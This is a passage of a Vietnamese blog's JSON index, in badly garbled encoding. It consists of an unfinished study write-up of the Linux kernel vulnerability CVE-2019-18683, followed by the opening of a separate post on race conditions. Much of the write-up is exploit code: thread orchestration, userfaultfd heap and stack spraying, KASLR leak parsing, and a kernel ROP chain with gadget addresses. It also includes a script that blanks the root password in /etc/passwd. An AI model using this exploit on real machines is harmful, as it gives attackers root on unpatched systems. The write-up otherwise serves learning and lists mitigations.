Ã¡nh xáº¡ trÃªn userspace. Deferencing con trá» nÃ y sáº½ cho lá»—i \u0026quot;unable to handle page fault\u0026quot;.\nLÃ­ do tráº£ vá» lá»—i vÃ¬ con trá» mÃ  chÃºng ta muá»‘n deferencing Ä‘ang á»Ÿ kernel thread context, nÆ¡i mÃ  userspace khÃ´ng thá»ƒ Ã¡nh xáº¡ tá»›i. Do Ä‘Ã³, váº¥n Ä‘á» lÃºc bÃ¢y giá», lÃ m sao Ä‘áº·t vb2_queue vÃ  vb2_mem_ops táº¡i nhá»¯ng vÃ¹ng nhá»› mÃ  biáº¿t Ä‘Æ°á»£c Ä‘á»‹a chá»‰, vÃ  cÃ³ thá»ƒ truy cáº­p tá»« kthread context. Trong hÃ m __vb2_queue_cancel() cho phÃ©p chÃºng ta gá»­i nhá»¯ng cáº£nh bÃ¡o (warning), Ä‘iá»u Ä‘Ã³ cÃ³ nghÄ©a chÃºng ta cÃ³ thá»ƒ phÃ¢n tÃ­ch cÃº phÃ¡p cá»§a kernel warning information (cÃ³ thá»ƒ thá»±c hiá»‡n trÃªn cÃ¡c ubuntu server). Äiá»u nÃ y cho phÃ©p chÃºng ta Ä‘Æ°a payload vÃ o kernel stackvÃ  giá»¯ nÃ³ báº±ng userfaultfd(), giá»‘ng nhÆ° kÄ© thuáº­t heap spraying sá»­ dá»¥ng userfaultfd() + setxattr(). HÃ m copy_from_user() sáº½ giÃºp ta Ä‘Æ°a dá»¯ liá»‡u vÃ o kernel stack. ChÃºng ta sáº½ phÃ¢n tÃ­ch cÃº phÃ¡p cá»§a warning Ä‘á»ƒ láº¥y Ä‘á»‹a chá»‰ cá»§a kernel stack vÃ  dá»± Ä‘oÃ¡n dá»± Ä‘oÃ¡n Ä‘á»‹a chá»‰ cá»§a payload. Exploit Orchestra Táº¡o ra pool of threads vÃ  Ä‘á»“ng bá»™ hÃ³a chÃºng báº±ng hÃ m pthread_barriers. DÆ°á»›i Ä‘Ã¢y lÃ  code pthread_barriersÄ‘Æ°á»£c Ä‘áº·t táº¡i cÃ¡c con trá» tham kháº£o chÃ­nh trong suá»‘t quÃ¡ trÃ¬nh khai thÃ¡c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0) #define THREADS_N 50 pthread_barrier_t barrier_prepare; pthread_barrier_t barrier_race; pthread_barrier_t barrier_parse; pthread_barrier_t barrier_kstack; pthread_barrier_t barrier_spray; pthread_barrier_t barrier_fatality; ... ret = pthread_barrier_init(\u0026amp;barrier_prepare, NULL, THREADS_N - 3); if (ret != 0) err_exit(\u0026#34;[-] pthread_barrier_init\u0026#34;); ret = pthread_barrier_init(\u0026amp;barrier_race, NULL, 2); if (ret != 0) err_exit(\u0026#34;[-] pthread_barrier_init\u0026#34;); ret = pthread_barrier_init(\u0026amp;barrier_parse, NULL, 3); if (ret != 0) err_exit(\u0026#34;[-] pthread_barrier_init\u0026#34;); ret = pthread_barrier_init(\u0026amp;barrier_kstack, NULL, 3); if (ret != 0) err_exit(\u0026#34;[-] pthread_barrier_init\u0026#34;); ret = pthread_barrier_init(\u0026amp;barrier_spray, NULL, THREADS_N - 5); if (ret != 0) err_exit(\u0026#34;[-] pthread_barrier_init\u0026#34;); ret = pthread_barrier_init(\u0026amp;barrier_fatality, NULL, 2); if (ret != 0) err_exit(\u0026#34;[-] pthread_barrier_init\u0026#34;); Má»—i thread cÃ³ má»™t vai trÃ² riÃªng. Trong trÆ°á»ng há»£p nÃ y, ta dÃ¹ng 50 thread vá»›i 5 vai trÃ² khÃ¡c nhau: 2 racer threads (THREADS_N - 6) = 44 sprayer pthreads, nhá»¯ng thread nÃ y sáº½ giá»¯ setxattr() Ä‘Æ°á»£c xá»­ lÃ­ bá»Ÿi userfaultfd() 2 pthread cho userfaulfd() xá»­ lÃ­ page fault. Äáº¿n Ä‘Ã¢y tÃ´i Ä‘Ã£ giáº£i Ä‘Ã¡p Ä‘Æ°á»£c tháº¯c máº¯c á»Ÿ trÃªn, 2 thread cho userfaultfd() xá»­ lÃ­ cho 44 sprayer pthreads. 1 pthread cho phÃ¢n tÃ­ch /dev/kmsg vÃ  xá»­ lÃ­ payload 1 fatility pthread chá»‹u trÃ¡ch nhiá»‡m kÃ­ch hoáº¡t leo thang Ä‘Äƒc quyá»n - privilege escalation. Nhá»¯ng con sá»‘ nÃ y tá»« Ä‘Ã¢u mÃ  ra hay chá»‰ chá»n random?\rNhá»¯ng thread vá»›i nhá»¯ng vai trÃ² khÃ¡c nhau sáº½ Ä‘Æ°á»£c Ä‘á»“ng bá»™ hÃ³a táº¡i cÃ¡c pthread_barries khÃ¡c nhau. Tham sá»‘ cuá»‘i cÃ¹ng cá»§a pthread_barrier_init() chá»‰ Ä‘á»‹nh sá»‘ thread PHáº¢I gá»i pthread_barrier_wait() cho tá»«ng barrier cá»¥ thá»ƒ trÆ°á»›c khi nÃ³ tiáº¿p tá»¥c giao tiáº¿p vá»›i nhau. Báº£ng sau sáº½ mÃ´ táº£ chi tiáº¿t táº¥t cáº£ cÃ¡c pthread vá»›i vai trÃ² khai thÃ¡c cá»§a nÃ³, Ä‘á»“ng bá»™ hÃ³a qua pthread_barrier_wait(). barrier Ä‘Æ°á»£c liá»‡t kÃª theo trÃ¬nh tá»± thá»i gian thá»±c hiá»‡n. Báº£ng nÃ y nÃªn Ä‘Æ°á»£c Ä‘á»c theo tá»«ng dÃ²ng vÃ  Ä‘á»«ng quÃªn, cÃ¡c pthread Ä‘ang thá»±c hiá»‡n song song. pthreads 2 racers 44 sprayers page fault hander #1 page fault hander #2 kmsg parser fatality 1. barrier_prepare (for 47 pthreads) wait on barrier 1. create files in tmpfs for doing setxattr() later 2. wait on barrier \u0026mdash; \u0026mdash; 1. open /dev/kmsg 2. wait on barrier \u0026mdash; 2. barrier_race (for 2 pthreads) 1. usleep() to let other pthread go to their next barrier 2. wait on barrier 3. race \u0026mdash; \u0026mdash; \u0026mdash; \u0026mdash; \u0026mdash; 3. barrier_parse (for 3 pthreads) wait on barrier \u0026mdash; \u0026mdash; \u0026mdash; 1. wait on barrier 2. parse the kernel warning to extract RSP and R11 (contains a pointer to code) 3. Calculate the address of the kernel stack top and the KASLR offset. adapt the pointers in the payloads for kernel heap and stack. \u0026mdash; 4. barrier_kstack (for 3 pthreads) 1. wait on barrier 2. place the kernel stack payload via adjtimex() and hang \u0026mdash; \u0026mdash; \u0026mdash; wait on barrier \u0026mdash; 5. barrier_spray (for 45 pthreads) \u0026mdash; 1. wait on barrier 2. place the kernel heap payload via setxattr() and hang \u0026mdash; 1. catch 2 page faults from adjtimex() called by racers. 2. wait on barrier \u0026mdash; \u0026mdash; 6. barrier_fatality (for 2 pthreads) \u0026mdash; \u0026mdash; 1. catch 44 page faults from setxattr() called by sprayers 2. wait on barrier \u0026mdash; \u0026mdash; 1. wait on barrier 2. trigger the payload for privilege escalation 3. the end! ChÆ°a náº¯m vá»¯ng / hiá»ƒu rÃµ cÃ¡c pthread Ä‘Æ°á»£c liá»‡t kÃª trong báº£ng trÃªn\rVáº¥n Ä‘á» Ä‘áº·t ra vá»›i tÃ´i bÃ¢y giá» lÃ  lÃ m sao Ä‘á»ƒ Ä‘iá»u khiá»ƒn cÃ¡c thread giá»‘ng nhÆ° table trÃªn. Quay láº¡i mÃ´n OS vÃ  nháº­n ra mÃ¬nh cháº£ nhá»› gÃ¬ cáº£ == háº­u quáº£ cá»§a viá»‡c há»c váº¹c. BÃ¢y giá» báº¯t Ä‘áº§u há»c vá» nÃ³\u0026hellip;\nOke, Ä‘Ã£ hiá»ƒu, chÃºng ta cÃ³ barrier lÃ  rÃ o cáº£n, khi Ä‘á»§ thread thÃ¬ nÃ³ sáº½ má»Ÿ cá»­a, váº­y lÃ m sao mÃ¬nh quáº£n lÃ­ Ä‘Æ°á»£c khi nÃ o cáº§n 2 thread, khi nÃ o cáº§n 44 thread? ÄÆ¡n giáº£n chÃºng ta dá»± vÃ o function, vÃ  Ä‘áº·t barrier vÃ o cuá»‘i nhá»¯ng function trÃªn. Good, TÃ´i Ä‘Ã£ hiá»ƒu Ä‘Æ°á»£c Ä‘oáº¡n nÃ y vÃ  Ä‘Ã£ cÃ³ idea tiáº¿p tá»¥c lÃ m. Anatomy of the exploit payload Payload sáº½ Ä‘Æ°á»£c táº¡o á»Ÿ 2 nÆ¡i: Trong kernel heap báº±ng sprayer threads báº±ng cÃ¡ch sá»­ dá»¥ng hÃ m setxattr() Ä‘Æ°á»£c xá»­ lÃ­ bá»Ÿi userfaultfd() Trong kernel stack báº±ng racer threads báº±ng cÃ¡ch sá»­ dá»¥ng adjtimex() Ä‘Æ°á»£c xá»­ lÃ­ bá»Ÿi userfaultfd(). System call nÃ y Ä‘Æ°á»£c chá»n vÃ¬ nÃ³ cÃ³ gá»i hÃ m copy_from_user() tá»›i kernel stack. Payload gá»“m 3 pháº§n: vb2_buffer trong kernel heap. vb2_queue trong kernel stack. vb2_mem_ops: trong kernel stack. DÆ°á»›i Ä‘Ã¢y lÃ  chÆ°Æ¡ng trÃ¬nh táº¡o payload. Báº¯t Ä‘áº§u pháº§n khai thÃ¡c, ta chuáº©n bá»‹ ná»™i dung cá»§a payload á»Ÿ userspace, vÃ¹ng nhá»› Ä‘Æ°á»£c táº¡o bá»Ÿi setxattr() syscall sáº½ Ä‘Æ°á»£c Ä‘Æ°a vÃ o kernel heap. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 #define MMAP_SZ 0x2000 #define PAYLOAD_SZ 504 void init_heap_payload() { struct vivid_buffer *vbuf = NULL; struct vb2_plane *vplane = NULL; for_heap = mmap(NULL, MMAP_SZ, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0); if (for_heap == MAP_FAILED) err_exit(\u0026#34;[-] mmap\u0026#34;); printf(\u0026#34; [+] payload for_heap is mmaped to %p\\n\u0026#34;, for_heap); /* Don\u0026#39;t touch the second page (needed for userfaultfd) */ memset(for_heap, 0, PAGE_SIZE); xattr_addr = for_heap + PAGE_SIZE - PAYLOAD_SZ; vbuf = (struct vivid_buffer *)xattr_addr; vbuf-\u0026gt;vb.vb2_buf.num_planes = 1; vplane = vbuf-\u0026gt;vb.vb2_buf.planes; vplane-\u0026gt;bytesused = 16; vplane-\u0026gt;length = 16; vplane-\u0026gt;min_length = 16; printf(\u0026#34; [+] vivid_buffer of size %lu is at %p\\n\u0026#34;, sizeof(struct vivid_buffer), vbuf); } adjtimex() syscall ghi dá»¯ liá»‡u vÃ o kernel stack 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #define PAYLOAD2_SZ 208 void init_stack_payload() { for_stack = mmap(NULL, MMAP_SZ, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0); if (for_stack == MAP_FAILED) err_exit(\u0026#34;[-] mmap\u0026#34;); printf(\u0026#34; [+] payload for_stack is mmaped to %p\\n\u0026#34;, for_stack); /* Don\u0026#39;t touch the second page (needed for userfaultfd) */ memset(for_stack, 0, PAGE_SIZE); timex_addr = for_stack + PAGE_SIZE - PAYLOAD2_SZ + 8; printf(\u0026#34; [+] timex of size %lu is at %p\\n\u0026#34;, sizeof(struct timex), timex_addr); } Sau khi bá»‹ race condition, pthread sáº½ phÃ¢n tÃ­ch cÃº phÃ¡p cá»§a kmsg, trÃ­ch xuáº¥t thÃ´ng tin tá»« kernel warning: GiÃ¡ trá»‹ RSP Ä‘á»ƒ tÃ­nh Ä‘á»‹a chá»‰ Ä‘á»‰nh cá»§a kernel stack GiÃ¡ trá»‹ R11 trá» Ä‘áº¿n má»™t sá»‘ vá»‹ trÃ­ khÃ´ng Ä‘á»•i trong kernel code. GiÃ¡ trá»‹ nÃ y giÃºp tÃ­nh toÃ¡n offset cá»§a KASLR. 1 2 3 4 5 6 7 8 9 10 #define R11_COMPONENT_TO_KASLR_OFFSET 0x195d80d #define KERNEL_TEXT_BASE 0xffffffff81000000 kaslr_offset = strtoul(r11, NULL, 16); kaslr_offset -= R11_COMPONENT_TO_KASLR_OFFSET; if (kaslr_offset \u0026lt; KERNEL_TEXT_BASE) { printf(\u0026#34;bad kernel text base 0x%lx\\n\u0026#34;, kaslr_offset); err_exit(\u0026#34;[-] kmsg parsing for r11\u0026#34;); } kaslr_offset -= KERNEL_TEXT_BASE; Sau Ä‘Ã³, pthread phÃ¢n tÃ­ch cÃº phÃ¡p cá»§a kmsg, Ä‘iá»u chá»‰nh payload trÃªn heap vÃ  stack. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 #define TIMEX_STACK_OFFSET 0x1d0 #define LIST_OFFSET 24 #define OPS_OFFSET 64 #define CMD_OFFSET 172 struct vivid_buffer *vbuf = (struct vivid_buffer *)xattr_addr; struct vb2_queue *vq = NULL; struct vb2_mem_ops *memops = NULL; struct vb2_plane *vplane = NULL; printf(\u0026#34;Adapt payloads knowing that kstack is 0x%lx, kaslr_offset 0x%lx:\\n\u0026#34;, kstack, kaslr_offset); /* point to future position of vb2_queue in timex payload on kernel stack */ vbuf-\u0026gt;vb.vb2_buf.vb2_queue = (struct vb2_queue *)(kstack - TIMEX_STACK_OFFSET); vq = (struct vb2_queue *)timex_addr; printf(\u0026#34; vb2_queue of size %lu will be at %p, userspace %p\\n\u0026#34;, sizeof(struct vb2_queue), vbuf-\u0026gt;vb.vb2_buf.vb2_queue, vq); /* just to survive vivid list operations */ vbuf-\u0026gt;list.next = (struct list_head *)(kstack - TIMEX_STACK_OFFSET + LIST_OFFSET); vbuf-\u0026gt;list.prev = (struct list_head *)(kstack - TIMEX_STACK_OFFSET + LIST_OFFSET); /* * point to future position of vb2_mem_ops in timex payload on kernel stack; * mem_ops offset is 0x38, be careful with OPS_OFFSET */ vq-\u0026gt;mem_ops = (struct vb2_mem_ops *)(kstack - TIMEX_STACK_OFFSET + OPS_OFFSET); printf(\u0026#34; mem_ops ptr will be at %p, userspace %p, value %p\\n\u0026#34;, \u0026amp;(vbuf-\u0026gt;vb.vb2_buf.vb2_queue-\u0026gt;mem_ops), \u0026amp;(vq-\u0026gt;mem_ops), vq-\u0026gt;mem_ops); memops = (struct vb2_mem_ops *)(timex_addr + OPS_OFFSET); /* vaddr offset is 0x58, be careful with ROP_CHAIN_OFFSET */ memops-\u0026gt;vaddr = (void *)ROP__PUSH_RDI__POP_RSP__pop_rbp__or_eax_edx__RET + kaslr_offset; printf(\u0026#34; mem_ops struct of size %lu will be at %p, userspace %p, vaddr %p at %p\\n\u0026#34;, sizeof(struct vb2_mem_ops), vq-\u0026gt;mem_ops, memops, memops-\u0026gt;vaddr, \u0026amp;(memops-\u0026gt;vaddr)); LÆ°á»£c Ä‘á»“ thá»ƒ hiá»‡n má»‘i quan há»‡ giá»¯a cÃ¡c thÃ nh pháº§n bÃªn trong kernel memory.\nChÆ°a thá»±c sá»± hiá»ƒu lÆ°á»£c Ä‘á»“\rROP\u0026rsquo;n\u0026rsquo;JOP Tiáº¿p theo sáº½ táº¡o ra ROP chain Ä‘á»ƒ khai thÃ¡c lá»—i.\nTá»« lÆ°á»£c Ä‘á»“, cÃ³ thá»ƒ tháº¥y void *(*vaddr)(void *buf_priv) lÃ  nÆ¡i chÃºng ta kiá»ƒm soÃ¡t luá»“ng thá»±c thi Ä‘á»ƒ táº¥n cÃ´ng. Tham sá»‘ buf_priv Ä‘Æ°á»£c láº¥y tá»« vb2_plane.mem_priv vÃ  giÃ¡ trá»‹ nÃ y thuá»™c quyá»n kiá»ƒm soÃ¡t cá»§a chÃºng ta. Trong linux kernel x86_64, tham sá»‘ Ä‘áº§u cá»§a hÃ m sáº½ Ä‘Æ°á»£c lÆ°u trong thanh ghi RDI, VÃ¬ tháº¿ chuá»—i lá»‡nh push rdi; pop rsp sáº½ Ä‘Æ°a stack pointer tá»›i nÆ¡i mÃ  chÃºng ta muá»‘n RDI. TiÃªp theo ROP chain cho má»¥c Ä‘Ã­ch leo thang Ä‘áº·c quyá»n: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #define ROP__PUSH_RDI__POP_RSP__pop_rbp__or_eax_edx__RET 0xffffffff814725f1 #define ROP__POP_R15__RET 0xffffffff81084ecf #define ROP__POP_RDI__RET 0xffffffff8101ef05 #define ROP__JMP_R15 0xffffffff81c071be #define ADDR_RUN_CMD 0xffffffff810b4ed0 #define ADDR_DO_TASK_DEAD 0xffffffff810bf260 unsigned long *rop = NULL; char *cmd = \u0026#34;/bin/sh /home/a13x/pwn\u0026#34;; /* rewrites /etc/passwd to drop root password */ size_t cmdlen = strlen(cmd) + 1; /* for 0 byte */ /* mem_priv is the arg for vaddr() */ vplane = vbuf-\u0026gt;vb.vb2_buf.planes; vplane-\u0026gt;mem_priv = (void *)(kstack - TIMEX_STACK_OFFSET + ROP_CHAIN_OFFSET); rop = (unsigned long *)(timex_addr + ROP_CHAIN_OFFSET); printf(\u0026#34; rop chain will be at %p, userspace %p\\n\u0026#34;, vplane-\u0026gt;mem_priv, rop); strncpy((char *)timex_addr + CMD_OFFSET, cmd, cmdlen); printf(\u0026#34; cmd will be at %lx, userspace %p\\n\u0026#34;, (kstack - TIMEX_STACK_OFFSET + CMD_OFFSET), (char *)timex_addr + CMD_OFFSET); /* stack will be trashed near rop chain, be careful with CMD_OFFSET */ *rop++ = 0x1337133713371337; /* placeholder for pop rbp in the pivoting gadget */ *rop++ = ROP__POP_R15__RET + kaslr_offset; *rop++ = ADDR_RUN_CMD + kaslr_offset; *rop++ = ROP__POP_RDI__RET + kaslr_offset; *rop++ = (unsigned long)(kstack - TIMEX_STACK_OFFSET + CMD_OFFSET); *rop++ = ROP__JMP_R15 + kaslr_offset; *rop++ = ROP__POP_R15__RET + kaslr_offset; *rop++ = ADDR_DO_TASK_DEAD + kaslr_offset; *rop++ = ROP__JMP_R15 + kaslr_offset; printf(\u0026#34; [+] the payload for kernel heap and stack is ready. Put it.\\n\u0026#34;); CÃ¡ch thá»©c hoáº¡t Ä‘á»™ng cá»§a ROP chain ROP chain Ä‘Æ°a Ä‘á»‹a chá»‰ cá»§a hÃ m run_cmd() tá»« kernel/reboot.c vÃ o thanh ghi R15. LÆ°u Ä‘á»‹a chá»‰ cá»§a lá»‡nh shell vÃ o thanh ghi RDI. Äá»‹a chá»‰ nÃ y sáº½ lÆ°u tham sá»‘ cá»§a hÃ m run_cmd(). ChÆ°Æ¡ng trÃ¬nh sáº½ nháº£y tá»›i run_cmd() Ä‘á»ƒ thá»±c thi /bin/sh /home/edisc/pwn vá»›i quyá»n root. Äoáº¡n mÃ£ nÃ y sáº½ viáº¿t láº¡i /etc/passwd cho phÃ©p chÃºng ta Ä‘Äƒng nháº­p vá»›i quyá»n root mÃ  khÃ´ng cáº§n password. 1 2 3 #!/bin/sh # drop root password sed -i \u0026#39;1s/.*/root::0:0:root:\\/root:\\/bin\\/bash/\u0026#39; /etc/passwd ROP chain nháº£y tá»›i __noreturn_do_task_dead() trong kernel/exit.c. Thao tÃ¡c nÃ y nháº±m trÃ¡nh trÆ°á»ng há»£p kthread hiá»‡n táº¡i khÃ´ng dá»«ng, nÃ³ sáº½ lÃ m kernel crash - chÃºng ta khÃ´ng muá»‘n Ä‘iá»u Ä‘Ã³. Má»™t sá»‘ áº£nh hÆ°á»Ÿng tá»›i viá»‡c khai thÃ¡c CÃ³ má»‘t sá»‘ tÃ­nh nÄƒng cá»§a kernel cÃ³ thá»ƒ áº£nh hÆ°á»Ÿng tá»›i viá»‡c khai thÃ¡c cá»§a chÃºng ta:\nThiáº¿t láº­p /proc/sys/vm/unprivileged_userfaultfd vÃª 0 sáº½ khÃ´ng cho phÃ©p payload Ä‘Æ°á»£c lÆ°u trong kernel. Viá»‡c nÃ y gÃ¢y ra háº¡n cháº¿, userfaultfd() chá»‰ hoáº¡t Ä‘á»™ng bá»Ÿi privileged users (vá»›i SYS_CAP_PTRACE capability). Thiáº¿t láº­p kernel.dmesg_restrict sysctl vá» 1 sáº½ cháº·n rÃ² rá»‰ thÃ´ng tin qua kernel log. VIá»‡c nÃ y háº¡n cháº¿ ngÆ°á»i dÃ¹ng Ä‘á»c thÃ´ng tin tá»« kerbel syslog qua dmesg. Tuy nhiÃªn, dÃ¹ cho kernel.dmesg_restrict = 1. NgÆ°á»i dÃ¹ng Ubuntu tá»« group adm váº«n cÃ³ thá»ƒ Ä‘á»c kernel log tá»« /var/log/syslog. Báº£n vÃ¡ cá»§a grsecurity/PaX cÃ³ má»™t tÃ­nh nÄƒng gá»i lÃ  PAX_RANDKSTACK lÃ m khÃ³ khÄƒn cho viá»‡c Ä‘oÃ¡n vá»‹ trÃ­ cá»§a vb2_qeue. PAX_RAP tá»« báº£n vÃ¡ cá»§a grsecurity/PaX cÃ³ thá»ƒ cháº·n ROP/JOP chain mÃ´ táº£ á»Ÿ trÃªn. poc detail Tiáº¿p theo chÃºng ta tiáº¿n hÃ nh viáº¿t poc Ä‘á»ƒ khai thÃ¡c lá»—i trÃªn\nMÃ´i trÆ°á»ng thá»±c thi qemu ubuntu server 18.04.3 How To Install \u0026ldquo;linux-tools-virtual-lts-vivid\u0026rdquo; Package on Ubuntu Trong quÃ¡ trÃ¬nh cÃ i Ä‘áº·t vÃ  kiá»ƒm tra vá»›i lá»‡nh getfacl /dev/video0 cÃ³ thá»ƒ báº¡n sáº½ bá»‹ lá»—i vÃ¬ thiÃªu thÆ° má»¥c dev/video0. BÃ i viáº¿t nÃ y giÃºp tÃ´i giáº£i quyáº¿t Ä‘Æ°á»£c váº¥n Ä‘á» nÃ y. CÃ i Ä‘áº·t KASAN Ä‘á»ƒ debug Init and start setxattr_userfaltfd_monitor, adjtimex_userfaultfd_monitor ChÃºng ta tiáº¿n hÃ nh táº¡o vÃ  cháº¡y setxattr_userfaultfd vÃ  adjtimex_userfaultfd Ä‘á»ƒ giÃ¡m sÃ¡t vÃ  xá»­ lÃ­ lá»—i pagefault 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 void init_setxattr_userfaultfd(){ long uffd; /* userfaultfd file descriptor */ /* start of region handled by userfaultfd */ unsigned long len; /* Length of region handled by userfaultfd */ pthread_t thr; /* ID of thread taht handles pagefaults */ struct uffdio_api uffdio_api; struct uffdio_register uffdio_register; int s; printf(\u0026#34;[+] init_setxattr_userfaultfd\\n\u0026#34;); page_size = sysconf(_SC_PAGE_SIZE); printf(\u0026#34;[*] pagesize = %lf\\n\u0026#34;, page_size); pthread_t thr2[100] = { 0 }; len = 4 * page_size; /* Create and enable userfaultfd object */ uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); if (uffd == -1) err_exit(\u0026#34;userfaultfd\u0026#34;); uffdio_api.api = UFFD_API; uffdio_api.features = 0; if (ioctl(uffd, UFFDIO_API, \u0026amp;uffdio_api) == -1) err_exit(\u0026#34;ioctl-UFFDIO_API\u0026#34;); /* Create a private anonymous mapping. The memory will be demand-zero paged--that is, not yet allocated. When we actually touch the memory, it will be allocated via the userfaultfd. */ xattr_addr = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); printf(\u0026#34;[+] The sexattr_addr anonymous page_addr: %p\\n\u0026#34;, xattr_addr); if (xattr_addr == MAP_FAILED) err_exit(\u0026#34;mmap\u0026#34;); uffdio_register.range.start = (unsigned long)xattr_addr + 2 * page_size; uffdio_register.range.len = 2*page_size; uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING; if (ioctl(uffd, UFFDIO_REGISTER, \u0026amp;uffdio_register) == -1) err_exit(\u0026#34;ioctl-UFFDIO_REGISTER\u0026#34;); /* Create a thread that will process the userfaultfd events */ s = pthread_create(\u0026amp;thr, NULL, fault_handler_thread, (void*)uffd); if (s != 0){ errno = s; err_exit(\u0026#34;pthread_create\u0026#34;); } } Trong hÃ m nÃ y, tÃ´i chÃº Ã½ tá»›i má»™t sá»‘ Ä‘iá»ƒm - nhá»¯ng Ä‘iá»ƒm nÃ y Ä‘á»‘i vá»›i tÃ´i á»Ÿ thá»i Ä‘iá»ƒm hiá»‡n táº¡i Ä‘á»c khÃ´ng hiá»ƒu / chÆ°a hiá»ƒu rÃµ:\nHÃ m sysconf(_SC_PAGE_SIZE): Nguá»“n tham kháº£o https://www.programmersought.com/article/80733633259/ https://zoomadmin.com/HowToInstall/UbuntuPackage/linux-tools-virtual-lts-vivid https://www.anquanke.com/post/id/200029 ","description":"Khai thÃ¡c lá»— há»•ng nhÃ¢n Linux trong há»‡ thá»‘ng con V4L2 (chÆ°a xong)","id":14,"section":"posts","tags":["cve, linux kernel, V4l2"],"title":"TÃ¬m hiá»ƒu vá» CVE-2019-18683","uri":"https://minhlongmt183.github.io/posts/cve-2019-18683/"},{"content":"\rBÃ i viáº¿t nÃ y nháº±m má»¥c Ä‘Ã­ch ghi láº¡i nhá»¯ng kiáº¿n thá»©c Ä‘Ã£ há»c Ä‘á»ƒ nhá»› vÃ  hiá»ƒu rÃµ hÆ¡n. BÃ i viáº¿t tham kháº£o chá»§ yáº¿u tá»« Winning the race: Signals, symlinks, and TOC/TOU\rGiá»›i thiá»‡u KhÃ´ng pháº£i táº¥t cáº£ race condition Ä‘á»u lÃ  lá»— há»•ng, nhá»¯ng pháº§n lá»›n cÃ¡c race condition sáº½ dáº«n tá»›i lá»— há»•ng á»Ÿ má»™t nÆ¡i nÃ o Ä‘Ã³. NÃ³i cÃ¡ch khÃ¡c, nhá»¯ng lá»— há»•ng hÃ¬nh thÃ nh do race condition thÆ°á»ng lÃ  nhá»¯ng lá»— há»•ng cá»±c kÃ¬ nghiÃªm trá»ng. Trong láº­p trÃ¬nh Ä‘a luá»“ng, race conditions khÃ´ng pháº£i lÃ  viá»‡c xuáº¥t hiá»‡n váº¥n Ä‘á» vÃ  ta khai thÃ¡c, nÃ³ chá»‰ lÃ  viá»‡c luá»“ng thá»±c thi khÃ´ng giá»‘ng nhÆ° chÃºng ta kÃ¬ vá»ng. Bugs cÃ³ thá»ƒ tá»“n táº¡i á»Ÿ má»i nÆ¡i, tá»« nhá»¯ng á»©ng dá»¥ng Linux á»Ÿ cáº¥p tháº¥p cho Ä‘áº¿n triá»ƒn khai DBMS quan há»‡ Ä‘a luá»“ng. Race conditions lÃ  gÃ¬? HÃ£y tÆ°á»Ÿng tÆ°á»£ng báº¡n Ä‘ang tham gia cuá»™c thi cháº¡y Ä‘iá»n kinh vÃ  Ä‘á»‘i thá»§ cá»§a báº¡n láº¡i lÃ  chá»‹ Nguyá»…n Thi ThÃºy Hiá»n. VÃ¬ Ä‘Ã£ ráº¥t ná»— lá»±c, báº¡n vÃ  chá»‹ Hiá»n ngang tÃ i ngang sá»©c vÃ  cÅ©ng bÆ°á»›c vÃ o giai Ä‘oáº¡n nÆ°á»›c rÃºt vá» Ä‘Ã­ch. Tháº­t báº¥t ngá», cáº£ 2 cÃ¹ng cháº¡m Ä‘Ã­ch cÃ¹ng má»™t lÃºc, há»‡ thá»‘ng cho tháº¥y cáº£ 2 cháº¡m váº¡ch Ä‘Ã­ch cÃ¹ng thá»i Ä‘iá»ƒm Ä‘áº¿n hÃ ng nano giÃ¢y. Náº¿u chá»‰ chá»n 1 quÃ¡n quÃ¢n váº­y ai sáº½ lÃ  quÃ¡n quÃ¢n? Báº¡n ? Hay chá»‹ Hiá»n? Hay cáº£ 2 (viá»‡c nÃ y sáº½ lÃ m giáº£m giÃ¡ trá»‹ cá»§a chá»©c quÃ¡n quÃ¢n)? Hay cháº³ng ai cáº£? tá»• chá»©c thi Ä‘áº¥u láº¡i? Má»i kháº£ nÄƒng Ä‘á»u cÃ³ thá»ƒ xáº£y ra vÃ  cháº³ng ai biáº¿t kháº£ nÄƒng nÃ o sáº½ xáº£y ra. Race condition trong trÆ°á»ng há»£p nÃ y cÅ©ng tÆ°Æ¡ng tá»± nhÆ° váº­y. Race conditions lÃ  má»™t chá»§ Ä‘á» cá»±c kÃ¬ lá»›n, vá»›i nhiá»u hÃ m Ã½ báº£o máº­t khÃ¡c nhau, tá»« hÃ nh vi khÃ´ng dá»± Ä‘oÃ¡n trÆ°á»›c Ä‘Æ°á»£c, khÃ´ng cÃ³ váº» nguy hiá»ƒm gÃ¬ cho Ä‘áº¿n sá»± cá»‘ mÃ¡y chá»§, chiáº¿m quyá»n Ä‘iá»u khiá»ƒn báº±ng thá»±c thi dÃ²ng lá»‡nh tá»« xa. NÃ³ báº¯t nguá»“n tá»« viá»‡c láº­p trÃ¬nh viÃªn giáº£ sá»­ chÆ°Æ¡ng trÃ¬nh cá»§a mÃ¬nh Ä‘ang cháº¡y tuyáº¿n tÃ­nh hoáº·c Ä‘ang cháº¡y song song nhÆ°ng khÃ´ng xem xÃ©t triá»‡t Ä‘á»ƒ, an toÃ n. ChÆ°Æ¡ng trÃ¬nh cá»§a há» cÃ³ thá»ƒ hoÃ n háº£o khi cháº¡y 1 hoáº¡t Ä‘á»™ng (operation), nhá»¯ng khi cháº¡y 2 hay nhiá»u operations trÃªn nhiá»u process khÃ¡c nhau, nÃ³ cÃ³ thá»ƒ dáº«n tá»›i luá»“ng thá»±c thi bá»‹ thay Ä‘á»•i, dáº«n tá»›i káº¿t quáº£ khÃ´ng mong muá»‘n 